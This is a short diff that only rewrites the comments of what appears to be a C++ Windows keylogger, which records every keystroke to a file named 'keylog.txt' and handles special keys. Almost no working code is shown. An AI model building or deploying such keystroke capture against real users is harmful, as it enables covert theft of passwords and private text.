@@ -1,4 +1,7 @@
-//This program records keystrokes in a text file called "keylog.txt"
+/*
+This program records keystrokes in a text file called "keylog.txt".
+The name of the text file can be edited to any preferance.
+*/
 
 #define _WIN32_WINNT 0x0500
 #include <Windows.h>
@@ -10,7 +13,8 @@ using namespace std;
 
 /*
 This function creates and opens a file called "keylog.txt".
-If the file is open, it starts writing the keystrokes to that file.
+It first checks to see if the file is open, and if it is,
+it starts recording the keystrokes to that file. 
 */
 
 void LOG(string keystroke)
@@ -26,9 +30,11 @@ void LOG(string keystroke)
 
 /*
 This bool function is used for the special keys on a keyboard.
-If a special key is pressed, the program will refer back to the LOG function
-and it will record the special key that was pressed
-For keys such as the return key, 
+If a special key is pressed, the program will refer back to the 
+LOG function and it will record the special key that was pressed.
+For keys such as the return key or the space key, there won't 
+actually be anything logged in the text file. Instead,
+you will just see a space in between woprds or a new line being started.
 */
 
 bool SpecialKeys(int S_key)
